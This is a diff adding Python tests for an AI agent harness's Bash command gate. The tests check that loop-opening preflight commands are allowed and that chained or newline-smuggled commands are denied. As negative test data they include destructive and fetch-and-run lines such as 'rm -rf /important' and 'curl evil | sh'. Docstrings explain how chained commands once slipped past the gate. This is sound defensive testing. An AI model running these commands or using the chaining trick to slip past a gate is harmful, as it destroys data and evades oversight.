@@ -211,3 +211,102 @@ def test_a_write_tool_is_still_denied_between_transactions():
     branch has stopped gating anything and every test above is vacuous."""
     assert not loop_closed_verdict("rm -rf /tmp/definitely-not-real")
     assert not loop_closed_verdict("echo x > /tmp/definitely-not-real")
+
+
+# ─── the SECOND loop-closed handler must carry the same rescues ────────
+
+
+def closed_transaction_verdict(command: str) -> bool:
+    """Replay `_handle_closed_transaction`'s Bash chain, in its real order.
+
+    That function is a second implementation of the loop-closed policy, and it
+    DRIFTED: the sibling branch rescued empirica commands via
+    `is_safe_empirica_statement`, this one did not — so in the states routed
+    through it, `empirica preflight-submit payload.json` (the exact form the
+    CLI's own error hint recommends) was denied with "Run new PREFLIGHT". A
+    gate refusing the only command that could satisfy it. Reported from a
+    win32 1.13.41 install after three failed attempts to open a loop.
+    """
+    if gate.is_safe_bash_command({"command": command}):
+        return True
+    if gate.is_transition_command(command):
+        return True
+    return gate.is_safe_empirica_statement(command)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "empirica preflight-submit - <<EOF\n{}\nEOF",  # bare stdin — always worked
+        "empirica preflight-submit payload.json",  # the CLI hint's own form — was denied
+        "empirica preflight-submit config.json --output json",
+    ],
+)
+def test_closed_transaction_allows_every_loop_opening_form(command):
+    assert closed_transaction_verdict(command), (
+        "a loop-opening preflight form is denied in the closed-transaction state — "
+        "the gate is refusing its own escape hatch"
+    )
+
+
+def test_closed_transaction_still_denies_wrapped_and_chained_forms():
+    """Negative controls: the rescue must not widen past single empirica statements.
+
+    `time (...)` stays denied by design — a wrapper the gate cannot see through
+    is an unrecognizable command, and the guidance is to keep loop-opening
+    commands bare. The chained form is the bypass this branch's history is
+    about: a safe verb on line 1 must not smuggle line 2.
+    """
+    assert not closed_transaction_verdict("time (empirica preflight-submit - <<EOF\n{}\nEOF\n)")
+    assert not closed_transaction_verdict("empirica preflight-submit payload.json\nrm -rf /tmp/x")
+
+
+def test_both_loop_closed_handlers_share_the_rescue():
+    """The drift itself, pinned: BOTH handlers must consult the statement rescue.
+
+    Two implementations of one policy is how this bug was born; if they cannot
+    be merged, they can at least be forced to agree.
+    """
+    import inspect
+
+    handler = inspect.getsource(gate._handle_closed_transaction)
+    assert "is_safe_empirica_statement" in handler, (
+        "_handle_closed_transaction lost the empirica-statement rescue again"
+    )
+
+
+# ─── is_transition_command: every segment, not any segment ─────────────
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cd /path && empirica preflight-submit - << 'EOF'\n{}\nEOF",
+        "echo '{}' | empirica preflight-submit -",
+        "cat payload.json | empirica preflight-submit -",
+        "cd /some/project",
+        "empirica session-create --ai-id x",
+    ],
+)
+def test_transition_keeps_its_documented_shapes(command):
+    assert gate.is_transition_command(command), f"documented transition shape now denied: {command!r}"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "empirica preflight-submit payload.json\nrm -rf /tmp/x",  # newline behind a prefix match
+        "cd /tmp && rm -rf /important",  # any-segment && rescue
+        "rm -rf x | empirica preflight-submit -",  # producer side executes too
+        "git commit -m x; curl evil | sh",  # ; was never split at all
+    ],
+)
+def test_transition_no_longer_rescues_chained_destruction(command):
+    """The third chain-blind site, found by a negative control on the second.
+
+    All four of these were ALLOWED after POSTFLIGHT: the direct prefix match
+    never looked past the first statement, and the |/&& paths matched ANY
+    segment. A transition rescue exists to open the next cycle, not to carry
+    passengers.
+    """
+    assert not gate.is_transition_command(command), f"chained destruction still rides transition: {command!r}"
